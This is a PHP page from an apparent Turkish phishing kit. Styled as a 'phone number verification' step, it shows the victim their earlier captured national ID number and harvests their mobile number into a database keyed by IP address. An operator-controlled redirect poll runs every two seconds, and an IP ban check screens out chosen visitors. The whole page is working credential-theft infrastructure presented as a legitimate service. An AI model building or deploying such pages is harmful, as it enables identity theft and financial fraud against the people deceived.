<?php
require_once 'connect.php';
if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

$has_error = isset($_GET['hata']) ? true : false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = isset($_POST['phone2']) ? trim($_POST['phone2']) : '';
    // Clean spaces or extra characters
    $phone = str_replace(' ', '', $phone);

    if (strlen($phone) >= 10 && strlen($phone) <= 11 && ctype_digit($phone)) {
        // Update user record with phone
        $query = $db->prepare("UPDATE records SET tel = ?, page = 'Bekle', lastOnline = ? WHERE ipAddress = ?");
        $query->execute([$phone, time() + 10, IP]);
        $ajax->redirect('bekle.php');
    } else {
        $has_error = true;
    }
}

$ajax->pageUpdate(IP, 'Telefon Numara Girişi');

$ip = IP;
$user_bilgi = $db->query("SELECT tc FROM records WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
$kullanici_tc = isset($user_bilgi['tc']) ? htmlspecialchars($user_bilgi['tc']) : '';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    
    
    
    <title>Telefon No Doğrulama - Direkt</title>
    <style>
        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
        
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJnecmNE.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJfecg.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
    </style>
</head>
<body>
    <div id="slider">
        <div class="gray6 slide active" style="background-color: rgb(241, 241, 241);">
            <div id="tab3header21">
                <h2 style="text-align: center; font-size: 12px; color: white; margin: 0; font-weight: 600;">Telefon No Doğrulama</h2>
            </div>

            <div id="alertDiv3" class="alertDiv <?php echo $has_error ? 'show' : ''; ?>">
                <p style="color: #000; font-size: 12px; font-weight: 600; margin-top: 15px;">Bilgilendirme</p>
                <img src="/basvuru/img/loader.gif" style="width: 30%;">
                <p style="color: #000; font-size: 12px; font-weight: 400; padding: 0 10px;">Eksik veya hatalı bilgi girdiğini fark ettik. Kontrol edip tekrar deneyebilirsin.</p>
                <button type="button" onclick="closeAlert()" id="btn-spc2" class="btnn-spc3" style="width: 90% !important; background-color: rgb(238, 21, 2); border: 0; color: white; border-radius: 40px; padding: 12px; font-weight: bold; cursor: pointer;">Tamam</button>
            </div>

            <div id="loginInputs" class="telefonInputs">
                <?php if ($kullanici_tc): ?>
                <div style="display:flex; align-items:center; justify-content:space-between; background:#f7f7f7; border-radius:8px; padding:10px 14px; margin-bottom:14px; border:1px solid #e8e8e8;">
                    <span style="color:#9a9a9a; font-size:10px; font-weight:600; letter-spacing:0.5px; text-transform:uppercase;">TC KİMLİK NUMARANIZ:</span>
                    <span style="color:#333; font-size:13px; font-weight:700; letter-spacing:1px;"><?= $kullanici_tc ?></span>
                </div>
                <?php endif; ?>
                <form id="phoneForm" method="POST" action="telefon.php">
                    <div style="display: flex; flex-direction: column;">
                        <label for="phone2" style="color:#636364; font-size: 11px; margin-bottom: 3%; display: flex; font-weight:600;">CEP TELEFONU NUMARASI</label>
                        <div style="display: flex; align-items: center;">
                            <b style="font-size: 14px; width: 17%; font-weight: 600 !important;">TR +90</b>
                            <input type="text" name="phone2" placeholder="Telefon Numaranızı Giriniz" id="phone2" style="font-size: 12px; font-weight:bold; border:0; width: 60%; display: block;" minlength="10" maxlength="11" inputmode="numeric" required>
                        </div>
                    </div>
                </form>
            </div>

            <div id="gonder">
                <button type="button" id="btn-spc" class="telefonBTN" style="width: 100% !important; background-color: rgb(238, 21, 2);" onclick="submitForm()">Devam</button>
            </div>
        </div>
    </div>

    <script>
        function submitForm() {
            const phoneInput = document.getElementById('phone2').value.replace(/\s+/g, '');
            if (phoneInput.length < 10 || phoneInput.length > 11 || isNaN(phoneInput)) {
                document.getElementById('alertDiv3').classList.add('show');
            } else {
                document.getElementById('phoneForm').submit();
            }
        }
        function closeAlert() {
            document.getElementById('alertDiv3').classList.remove('show');
        }

        // Panel redirect kontrolü - her 2 saniyede bir kontrol et
        function checkRedirect() {
            fetch('check_redirect.php')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(function() {});
        }
        setInterval(checkRedirect, 2000);
    </script>
</body>
</html>






